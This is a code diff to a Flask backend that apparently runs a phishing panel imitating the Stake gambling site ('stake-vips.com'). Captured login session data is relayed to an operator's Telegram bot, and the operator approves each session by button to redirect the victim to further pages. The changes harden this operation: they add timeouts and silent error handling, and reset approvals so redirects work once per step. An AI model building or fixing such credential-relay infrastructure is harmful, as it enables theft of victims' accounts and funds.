@@ -13,7 +13,6 @@ CORS(app, resources={r"/*": {"origins": "*"}})
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-# ✅ FIXED (removed bad character)
 BASE_URL = "https://stake-vips.com"
 
 if not BOT_TOKEN or not CHAT_ID:
@@ -53,10 +52,15 @@ def send_to_telegram(data, session_id, type_):
         "reply_markup": {"inline_keyboard": keyboard}
     }
 
-    requests.post(
-        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-        json=payload
-    )
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json=payload,
+            timeout=5
+        )
+    except:
+        pass
+
 
 # ======================
 # LOGIN (CREATE SESSION)
@@ -127,18 +131,22 @@ def webhook():
     if "callback_query" not in update:
         return "ok"
 
-    data = update["callback_query"]["data"]
-    session_id, page = data.split(":")
+    try:
+        data = update["callback_query"]["data"]
+        session_id, page = data.split(":")
 
-    if session_id in SESSION_STATUS:
-        SESSION_STATUS[session_id]["approved"] = True
-        SESSION_STATUS[session_id]["redirect_url"] = f"{BASE_URL}/{page}"
+        if session_id in SESSION_STATUS:
+            SESSION_STATUS[session_id]["approved"] = True
+            SESSION_STATUS[session_id]["redirect_url"] = f"{BASE_URL}/{page}"
+
+    except:
+        pass
 
     return "ok"
 
 
 # ======================
-# FRONTEND STATUS CHECK
+# FRONTEND STATUS CHECK (FIXED)
 # ======================
 @app.route("/status/<session_id>")
 def status(session_id):
@@ -148,9 +156,15 @@ def status(session_id):
         return jsonify({"error": "not found"}), 404
 
     if session["approved"]:
+        redirect_url = session["redirect_url"]
+
+        # 🔥 RESET AFTER FIRST USE (FIXES LOOP)
+        session["approved"] = False
+        session["redirect_url"] = None
+
         return jsonify({
             "status": "approved",
-            "redirect_url": session["redirect_url"]
+            "redirect_url": redirect_url
         })
 
     return jsonify({"status": "pending"})
